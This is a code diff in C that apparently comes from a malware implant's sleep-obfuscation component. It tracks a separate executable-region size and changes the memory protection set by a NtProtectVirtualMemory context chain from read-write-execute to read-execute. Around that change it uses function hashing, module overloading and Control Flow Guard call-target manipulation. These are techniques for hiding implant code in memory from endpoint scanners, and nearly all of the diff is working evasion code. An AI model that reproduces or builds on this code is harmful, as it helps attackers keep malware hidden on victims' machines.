@@ -67,7 +67,8 @@ typedef struct {
     ULONG    szK32;
 
     PVOID    Buffer;
-    ULONG    Length;
+    DWORD64  Length;
+    DWORD64  ExecRegionSize;
     NTSTATUS CFG;
     DWORD    dwMilliseconds;
     UCHAR    enckey[KEY_SIZE];
@@ -343,8 +344,8 @@ SECTION( D ) VOID delayExec( PAPI pApi, PIMAGE_DOS_HEADER OverloadModule )
     Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
     Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
     Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
-    Contexts[c]->R8  = U_PTR( &pApi->Length );
-    Contexts[c]->R9  = U_PTR( PAGE_EXECUTE_READWRITE );
+    Contexts[c]->R8  = U_PTR( &pApi->ExecRegionSize );
+    Contexts[c]->R9  = U_PTR( PAGE_EXECUTE_READ );
     *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;
 
     c--;
@@ -455,7 +456,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
 
     pApi->kb.SetProcessValidCallTargets         = FindFunction( hKb, H_API_SETPROCESSVALIDCALLTARGETS );
     pApi->k32.WaitForSingleObjectEx             = FindFunction( pApi->hK32, H_API_WAITFORSINGLEOBJECTEX );
-    pApi->k32.Sleep             = FindFunction( pApi->hK32, H_API_SLEEP );
+    pApi->k32.Sleep                             = FindFunction( pApi->hK32, H_API_SLEEP );
 
     if( !pApi->hAdvapi )
     {
@@ -498,6 +499,7 @@ SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
     Api.dwMilliseconds = dwMilliseconds;
     Api.Buffer         = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
     Api.Length         = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );
+    Api.ExecRegionSize = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegionSize );
 
     if( resolveSleepHookFunctions( &Api ) == STATUS_SUCCESS )
     {
